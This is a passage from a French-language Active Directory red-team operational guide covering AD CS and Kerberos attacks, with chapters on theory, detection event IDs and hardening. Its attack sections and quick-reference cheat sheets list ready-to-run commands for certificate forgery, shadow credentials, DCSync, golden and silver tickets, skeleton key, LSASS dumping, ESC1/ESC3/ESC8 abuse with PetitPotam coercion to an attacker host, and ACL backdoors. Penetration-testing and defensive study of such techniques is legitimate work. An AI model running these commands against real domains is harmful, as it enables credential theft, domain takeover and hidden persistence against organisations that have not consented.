# Forge certificate pour ANY user
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword password --Subject "CN=Administrator" --SubjectAltName "administrator@domain.local" --NewCertPath admin.pfx --NewCertPassword password

# Auth
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:password /ptt
```

**Défense**:
- **REBUILD PKI** (seule solution complète)
- HSM pour CA private key
- Offline Root CA
- Monitor CA backup operations (Event 4882)

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Module 6: Techniques Avancées

### 6.1 Shadow Credentials

**Concept**: Abuse `msDS-KeyCredentialLink` attribute

**Requirements**:
- WriteProperty sur user/computer object
- Domain functional level ≥ 2016
- At least one DC Windows Server 2016+

**Whisker**:
```powershell
# Add key credential
Whisker.exe add /target:targetuser /domain:domain.local /dc:dc.domain.local /path:cert.pfx /password:password

# Output: pfx file + DeviceID

# Auth
Rubeus.exe asktgt /user:targetuser /certificate:cert.pfx /password:password /ptt
```

**Certipy** (auto):
```bash
# Add shadow credential
certipy shadow auto -u 'attacker@domain.local' -p password -account targetuser

# Auth
certipy auth -pfx targetuser.pfx
```

**Cleanup**:
```powershell
Whisker.exe remove /target:targetuser /deviceid:DEVICE-ID
```

**Pywhisker** (Linux):
```bash
python3 pywhisker.py -d domain.local -u attacker -p password --target targetuser --action add
```

---

### 6.2 CertPotato

**Concept**: Local privilege escalation via SSPI relay

**Scenario**: Low-priv user sur machine → SYSTEM

**Requirements**:
- `SeImpersonatePrivilege` (IIS, SQL Server)
- AD CS accessible

**Usage**:
```powershell
CertPotato.exe -c "whoami" -u user -p password -dc dc.domain.local
```

**Alternative**: Combine avec other potatoes (SweetPotato, GenericPotato)

[↑ Retour au sommaire](#-table-des-matières-complète)

---

# PART 3: THÉORIE

> **📖 Pour guide théorique complet**: Voir [AD-ADCS-Vulnerabilities-Explained.md](AD-ADCS-Vulnerabilities-Explained.md) (1404 lignes)

## Chapitre 1: Fonctionnalité vs Faille

### 1.1 Définitions Critiques

**Faille (Bug)**:
- Erreur de programmation
- Comportement NON intentionnel
- Patch = correction code

**Fonctionnalité exploitable (Feature Abuse)**:
- Comportement INTENTIONNEL
- Créé pour besoins métier légitimes
- "Fix" = configuration + monitoring, pas patch

### 1.2 Importance Distinction

**Pourquoi crucial**:
- **Bug**: Microsoft peut patcher → problème résolu
- **Feature**: Microsoft ne peut pas "patcher" → configuration requise
- Impact communication clients: "Ce n'est pas une faille, c'est une fonctionnalité mal configurée"

**Exemples**:
- ❌ **Bug**: CVE-2020-1472 (Zerologon) → patch corrige
- ✅ **Feature**: Kerberos Delegation → existe par design, configuration sécurise

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Chapitre 3: Kerberos Delegation - Cas d'École

### 3.1 Besoin Métier Réel

**Scenario**: Application web 3-tier

```
User → IIS (Web) → SQL Server (Database)
```

**Problème**: IIS doit accéder SQL **au nom du user**

**Sans delegation**:
- IIS accède SQL avec **service account**
- SQL voit IIS service account, pas user
- Access denied (user n'a pas permissions)

**Avec delegation**:
- User auth à IIS
- IIS **impersonne user**
- IIS → SQL au nom de user
- SQL voit user → access granted

### 3.2 Unconstrained Delegation Design

**Comment ça marche**:
1. User auth à IIS
2. User **TGT included** dans service ticket
3. IIS peut utiliser TGT pour accéder **ANY** service

**Pourquoi créé ainsi**:
- ✅ Simplicité (un flag)
- ✅ Flexibilité maximum
- ✅ Fonctionne pour n'importe quel service backend

**Exploitation**:
- TGT reste en mémoire
- Compromise IIS = capture TGT DA

**Pourquoi Microsoft ne "fixe" pas**:
- Applications légitimes dépendent dessus (SharePoint, Exchange, Citrix)
- Breaking change catastrophique
- Alternative = Constrained Delegation (mais migration complexe)

### 3.3 Constrained Delegation Design

**Amélioration**: Restreindre à services spécifiques

**Protocol S4U**:
- S4U2Self: Service request TGS for itself on behalf of user
- S4U2Proxy: Use TGS to access backend

**Exploitation**:
- S4U permet impersonate ANY user (by design)
- Alternative service names not validated

**Pourquoi exploitable**:
- S4U = fonctionnalité légitime
- Trust service account = trust delegation decisions

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Chapitre 5: AD CS Design

### 5.3 ESC1 - Design Intention

**ENROLLEE_SUPPLIES_SUBJECT = Feature légitime**

**Besoins métier réels**:
1. **Web servers multi-DNS**: Un server, plusieurs noms DNS (www.site.com, api.site.com)
2. **Users multi-UPNs**: Après merger, user a UPN ancien + nouveau
3. **Service accounts cross-domain**: Service dans child, accès parent
4. **Smart card kiosks**: Enrollment pour users sans credentials

**Exploitation**:
- Low-priv user specify SAN = administrator@domain.local
- Instant Domain Admin

**Pourquoi permis avant 2022**:
- Microsoft philosophy: **Trust admin configuration**
- Assume: Si admin configure template, admin sait ce qu'il fait
- Pas de validation SAN vs requester identity

**KB5014754 (May 2022)**:
- Strong Certificate Binding
- Requester SID embedded dans certificate
- Validation: SAN must match requester

### 5.5 ESC8 - Web Enrollment

**Pourquoi Web Enrollment existe**:
- Enrollment pour non-domain devices
- Mobiles, remote workers
- Legacy OS sans AD integration

**Pourquoi NTLM**:
- Backward compatibility
- Fonctionne sans Kerberos

**Exploitation**:
- NTLM relay (PetitPotam)
- Computer cert → DCSync

**KB5014754 fix**:
- EPA (Extended Protection for Authentication)
- Certificate mapping avec SID

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Chapitre 7: NTLM Legacy

### 7.1 Pourquoi NTLM Existe Encore

**24 ans après Kerberos**, NTLM toujours présent

**Kerberos requirements**:
- Domain-joined
- Time sync (<5min skew)
- DNS functional
- DC accessible
- SPN registered

**NTLM works when**:
- Workgroup machines
- Time sync broken
- DNS issues
- DC unreachable
- IP address connection (no DNS)
- Fallback mechanism

**Cas légitimes**:
- Local admin logon (DOMAIN\Administrator)
- Non-domain devices
- Legacy applications
- Troubleshooting
- SQL Server IP connection

### 7.3 Pourquoi Pas Désactivé

**Breaking change catastrophique**:
- Legacy line-of-business apps
- Third-party software
- Network devices (printers, NAS)
- Embedded systems

**Microsoft strategy**:
- Tools pour identifier usage (ATA/MDI)
- Monitor NTLM traffic
- Gradually restrict
- Per-application exceptions
- Transition 3-5 ans pour large enterprises

**Réalité**: Disable NTLM = break 30-50% applications typiquement

[↑ Retour au sommaire](#-table-des-matières-complète)

---

# PART 4: DÉFENSE ET DÉTECTION

## Détection AD

### Event IDs AD

**Kerberoasting**:
- **4769**: TGS Request
  - Filter: Encryption Type = 0x17 (RC4)
  - Service Name ≠ krbtgt
  - Service Name ≠ $

**AS-REP Roasting**:
- **4768**: TGT Request
  - Pre-Authentication Type = 0 (sans preauth)

**DCSync**:
- **4662**: Directory Service Access
  - Object Type = {19195a5b-6da0-11d0-afd3-00c04fd930c9} (Domain)
  - Access Mask = 0x100 (Control Access)
  - Properties = {1131f6aa...} (Replication)

**Golden Ticket**:
- **4768**: TGT Request
  - Account Name = unusual/non-existent
  - Ticket Lifetime > 10 hours
  - Encryption downgrade (RC4 when AES available)

**Silver Ticket**:
- **4769**: TGS Request
  - Without prior 4768 (TGT)
  - Unusual service access patterns

**AdminSDHolder Modification**:
- **5136**: Directory Object Modified
  - Object DN contains AdminSDHolder
  - Alert on ANY modification

**Skeleton Key**:
- **7045**: Service Installation (si deployed as service)
- **4673**: Sensitive Privilege Use (SeDebugPrivilege)

### Protected Users Group

**Purpose**: Protection haute-sécurité

**Restrictions membres**:
- Cannot use NTLM
- Cannot use DES/RC4
- Cannot be delegated
- TGT lifetime = 4 hours (vs 10h)
- Cannot use CredSSP

**Ajouter users**:
```powershell
Add-ADGroupMember -Identity "Protected Users" -Members da_account
```

**Limitations**:
- ⚠️ Break applications qui require delegation
- ⚠️ Break applications qui use NTLM
- ⚠️ Require testing avant deployment

### MDI (Microsoft Defender for Identity)

**Détections automatiques**:
- Kerberoasting
- AS-REP Roasting
- DCSync
- Golden Ticket
- Skeleton Key
- Pass-the-Hash
- Pass-the-Ticket
- NTLM Relay

**Setup**:
```powershell
# Deploy sensor sur DCs
# Configure workspace
# Monitor alerts dans M365 Defender
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Détection AD CS

### Event IDs AD CS

**Certificate Request**:
- **4886**: Certificate Services received request
  - Log ALL requests
  - Check Requester vs SAN

**Certificate Issued**:
- **4887**: Certificate Services approved and issued
  - **CRITICAL**: Alert si SAN ≠ Subject
  - Monitor for unusual requesters

**CA Configuration Changed**:
- **4885**: Audit filter changed
  - **HIGH SEVERITY**: CA config modification

**CA Backup**:
- **4882**: Security permissions for Certificate Services changed
  - Alert: Potential DPERSIST1 attempt

**Template Modified**:
- **5136**: Directory object modified (template object)
  - Baseline templates
  - Alert on modifications

**PKINIT + U2U (UnPAC indicator)**:
- **4768**: TGT Request with PKINIT
- **4769**: TGS Request with U2U flag

### Template Hardening

**Checklist sécurité**:
```
✅ Disable ENROLLEE_SUPPLIES_SUBJECT (si pas requis)
✅ Enable Manager Approval
✅ Require "This number of authorized signatures": 1+
✅ Set validity period short (<1 an)
✅ Restrict enrollment rights (pas Authenticated Users)
✅ Review EKUs (remove Any Purpose)
✅ Enable "Subject name in request"? → NO (sauf besoins légitimes)
✅ Monitor template ACLs
✅ Audit certificate requests (4886/4887)
```

**PowerShell audit**:
```powershell
# List templates avec ENROLLEE_SUPPLIES_SUBJECT
Get-ADObject -Filter * -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" | Where-Object {$_.'msPKI-Certificate-Name-Flag' -band 1}

# Remediate
# Certutil or AD modification
```

### CA Protection

**Best Practices**:
1. **Offline Root CA**: Root CA hors ligne, seulement pour sign Issuing CA
2. **HSM**: Hardware Security Module pour CA private key
3. **EPA**: Extended Protection for Authentication sur Web Enrollment
4. **HTTPS only**: Disable HTTP enrollment
5. **Restrict permissions**: Limit ManageCA, Manage Certificates rights
6. **Audit**: Enable auditing 4885, 4886, 4887, 4882

**Strong Certificate Binding**:
```cmd
# Enable on DCs (KB5014754)
reg add HKLM\SYSTEM\CurrentControlSet\Services\Kdc /v StrongCertificateBindingEnforcement /t REG_DWORD /d 2

# Values:
# 0 = Disabled
# 1 = Compatibility mode
# 2 = Full enforcement (recommandé)
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Prévention

### Tiering Model

**Concept**: Séparer administration en tiers

```
Tier 0 (Domain/Forest)
  ├─ Domain Controllers
  ├─ AD CS CAs
  ├─ ADFS
  └─ Privileged admin accounts

Tier 1 (Servers)
  ├─ Application servers
  ├─ Database servers
  └─ Server admins

Tier 2 (Workstations)
  ├─ User workstations
  └─ Help Desk, local admins
```

**Règle fondamentale**: Pas de logon Tier N avec credentials Tier N-1

**Enforcement**:
- Authentication Policy Silos
- GPO logon restrictions
- Credential Guard

### PAWs

**Privileged Access Workstations**:
- Dedicated workstations pour admin Tier 0
- Hardened OS
- Application whitelisting
- No internet access
- No email

**Implementation**:
```
PAW → Tier 0 management ONLY
Jump Server → Tier 1 management
Regular Workstation → Tier 2
```

### LAPS Deployment

**Local Administrator Password Solution**:
```powershell
# Install LAPS
# Deploy GPO
Set-GPRegistryValue -Name "LAPS Policy" -Key "HKLM\Software\Policies\Microsoft Services\AdmPwd" -ValueName "AdmPwdEnabled" -Type DWord -Value 1

# Set password complexity
Set-GPRegistryValue -Name "LAPS Policy" -Key "HKLM\Software\Policies\Microsoft Services\AdmPwd" -ValueName "PasswordComplexity" -Type DWord -Value 4

# Set expiration
Set-GPRegistryValue -Name "LAPS Policy" -Key "HKLM\Software\Policies\Microsoft Services\AdmPwd" -ValueName "PasswordAgeDays" -Type DWord -Value 30
```

### JIT/JEA

**Just-In-Time Admin**:
- Temporary elevation
- Time-limited
- Approval workflow

**Just-Enough-Admin**:
- Constrained PowerShell endpoints
- Limited cmdlets
- Audit all actions

[↑ Retour au sommaire](#-table-des-matières-complète)

---

# PART 5: QUICK REFERENCE

## Commandes AD par Phase

### Ref: Enumération

```powershell
# Domain
Get-Domain
Get-DomainController
Get-DomainTrust

# Users
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
Get-DomainUser -AdminCount

# Groups
Get-DomainGroup -AdminCount
Get-DomainGroupMember "Domain Admins" -Recurse

# Computers
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedToAuth

# ACLs
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs

# BloodHound
.\SharpHound.exe -c DCOnly
```

### Ref: Credentials

```powershell
# Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'

# Alternatives
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> lsass.dmp full
```

### Ref: Kerberos

```powershell
# Kerberoast
Rubeus.exe kerberoast /outfile:hashes.txt
Get-DomainUser -SPN | Get-DomainSPNTicket | fl

# AS-REP Roast
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# PTH
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:HASH /run:powershell.exe"'

# OPTH
Rubeus.exe asktgt /user:Administrator /rc4:HASH /ptt

# PTT
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Ref: Delegation

```powershell
# Unconstrained
Get-DomainComputer -Unconstrained
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# Constrained
Get-DomainUser -TrustedToAuth
Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc.local /ptt

# RBCD
Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
Rubeus.exe s4u /user:FAKE$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET /ptt
```

### Ref: Persistence

```powershell
# Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:SID /krbtgt:HASH /ptt"'

# Silver Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:SID /target:dc.local /service:cifs /rc4:HASH /ptt"'

# Skeleton Key
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'

# AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All

# DCSync Rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Commandes AD CS

### Ref: ADCS Enum

```bash
# Certipy
certipy find -u 'user@domain.local' -p password -vulnerable -stdout
certipy find -u user -p password -vulnerable -bloodhound

# Certify
Certify.exe cas
Certify.exe find /vulnerable
Certify.exe find /enrolleeSuppliesSubject
```

### Ref: ESC Exploits

```bash
# ESC1
certipy req -u user@domain.local -p password -ca CA -template VulnTemplate -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# ESC3
certipy req -u user -p password -ca CA -template EnrollmentAgent
certipy req -u user -p password -ca CA -template User -on-behalf-of 'domain\Administrator' -pfx agent.pfx
certipy auth -pfx administrator.pfx

# ESC8
certipy relay -target http://ca/certsrv/certfnsh.asp
python3 PetitPotam.py attacker-ip dc.domain.local
```

### Ref: THEFT

```bash
# UnPAC the Hash
certipy auth -pfx user.pfx -dc-ip dc.domain.local

# Shadow Credentials
certipy shadow auto -u attacker@domain.local -p password -account target
certipy auth -pfx target.pfx
```

### Ref: ADCS Persistence

```bash
# Certificate Renewal
certipy req -u admin@domain.local -p password -ca CA -template User -renew

# Forge CA Cert (DPERSIST1)
ForgeCert.exe --CaCertPath ca.pfx --Subject "CN=Administrator" --SubjectAltName administrator@domain.local --NewCertPath admin.pfx
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /ptt
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## Outils Référence

### PowerShell Tools

```
PowerView       → AD enumeration
PowerUp         → Local privesc
Invoke-Mimikatz → Credential dumping
ADModule        → Microsoft AD cmdlets
```

### C# Tools

```
Rubeus     → Kerberos attacks
Certify    → AD CS enumeration
SharpHound → BloodHound collection
Whisker    → Shadow Credentials
ForgeCert  → Forge certificates
Seatbelt   → Host enumeration
```

### Python Tools

```
Impacket        → secretsdump, psexec, getST, etc.
Certipy         → AD CS attacks (all-in-one)
BloodHound.py   → Collection sans Windows
CrackMapExec    → Network attacks
Coercer         → Authentication coercion
```

---

## One-Liners Critiques

```powershell
# Quick DA check
Get-DomainGroupMember "Domain Admins"

# Quick wins enumeration
Get-DomainUser -SPN | Select samaccountname
Get-DomainUser -PreauthNotRequired | Select samaccountname
Get-DomainComputer -Unconstrained | Select dnshostname

# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'

# ESC1 Quick Win
certipy req -u user@domain.local -p password -ca CA -template VulnTemplate -upn administrator@domain.local && certipy auth -pfx administrator.pfx

# Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt"'

# BloodHound Quick Collection
.\SharpHound.exe -c DCOnly --OutputPrefix quick
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

# 🎯 FIN DU GUIDE

**Vous disposez maintenant de**:
- ✅ Méthodologie complète Red Team
- ✅ AD Core Attacks (Phases 0-8)
- ✅ AD CS Attacks (ESC + THEFT + PERSIST)
- ✅ Théorie (Pourquoi ces vulns existent)
- ✅ Défense et Détection
- ✅ Quick Reference

**Guides complémentaires**:
- 📖 [ADCS-Attacks-Complete-Guide.md](ADCS-Attacks-Complete-Guide.md) - Deep dive AD CS
- 📖 [AD-Advanced-Notes-Complete.md](AD-Advanced-Notes-Complete.md) - All AD techniques détaillées
- 📖 [AD-ADCS-Vulnerabilities-Explained.md](AD-ADCS-Vulnerabilities-Explained.md) - Théorie complète
- 📖 [README-GUIDE-COMPLET.md](README-GUIDE-COMPLET.md) - Mode d'emploi

**Stay curious. Stay humble. Stay legal.** ⚡

---

**Active Directory Red Team - Guide Opérationnel Complet**  
**Version: 1.0**  
**Dernière mise à jour: 2025-12-13**
